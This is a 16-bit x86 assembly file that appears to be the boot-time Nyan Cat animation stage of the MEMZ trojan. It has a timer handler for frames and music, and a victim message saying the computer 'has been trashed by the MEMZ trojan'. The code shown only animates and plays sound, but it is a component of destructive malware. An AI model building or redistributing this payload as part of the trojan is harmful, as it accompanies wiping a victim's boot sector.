; This file contains the actual animation
use16
org 0x8000

%include "setup.asm"
%include "macros.asm"

timerHandler:
	pusha
	
	checkTimer [cs:frameTickCounter],  8, "displayframe.asm"
	checkTimer [cs:noteTickCounter],  12, "playnote.asm"
	checkTimer [cs:nyanTickCounter],  10, "countnyan.asm"
	
	; Acknowledge Interrupt
	mov al, 0x20
	out 0x20, al
	
	popa
	iret

frameTickCounter db 0
noteTickCounter  db 0
nyanTickCounter  db 0

frameIndex dw 0

soundIndex dw song
soundWait  db 0

nyanTimeStart: db "You Nyaned for "
nyanTime: db "000000.0"
nyanTimeLen equ $-nyanTime
nyanTimeEnd: db " seconds!"
nyanTimeLenFull equ $-nyanTimeStart

nyanTimeBin dw 0

; Data

frames:        incbin "../../Build/frames.bin"
framesLength:  equ $-frames

special:       incbin "../../Build/special.bin"
specialLength: equ $-special

song:        incbin "../../Build/song.bin"
songLength:  equ $-song

message:       db "Your computer has been trashed by the MEMZ trojan. Now enjoy the Nyan Cat..."
messageLength: equ $-message